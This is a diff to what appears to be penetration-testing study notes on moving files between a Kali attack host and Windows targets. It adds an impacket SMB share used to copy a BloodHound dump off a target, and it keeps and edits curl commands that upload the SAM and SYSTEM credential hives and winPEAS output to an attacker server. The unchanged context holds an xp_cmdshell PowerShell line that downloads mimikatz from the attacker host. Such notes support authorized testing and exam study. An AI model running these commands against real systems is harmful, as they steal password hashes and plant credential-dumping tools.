@@ -281,7 +281,7 @@ Kali port:
     sudo python3 -m http.server 80
     nc <target> <port>
     iwr -uri http://<kali>/<program> -Outfile <program>
-
+    
     ##Certutil
     certutil -urlcache -f http://<Kali-IP>/file.exe file.exe
 
@@ -289,6 +289,14 @@ Kali port:
     EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://<kali>:1234/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'
     
     ###From Windows (netcat) to Kali###
+    ##SMB
+    --Kali terminal
+    impacket-smbserver test . -smb2support  -username random_user -password random_password  
+
+    --Target
+    PS C:\Users\marcus> net use m: \\<kali>\test /user:random_user random_password  
+    PS C:\Users\marcus> copy C:\users\<user>\20250830045215_BloodHound.zip m:\  
+
     ##UploadServer
     --Kali terminal
     mkdir -p /home/kali/uploads
@@ -297,9 +305,9 @@ Kali port:
     pipx run uploadserver --directory /home/kali/uploads 8008
 
     --target terminal
-    C:\Users\dave>curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\sam"
-    C:\Users\dave>curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\system"
-    C:\Users\dave>curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\winPEAS-results.txt"
+    C:\Users\dave>curl.exe -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\sam"
+    C:\Users\dave>curl.exe -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\system"
+    C:\Users\dave>curl.exe -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\winPEAS-results.txt"
     ```
   - **C:\Windows\System32\config\SAM**
   - **C:\Windows\System32\config\SYSTEM**
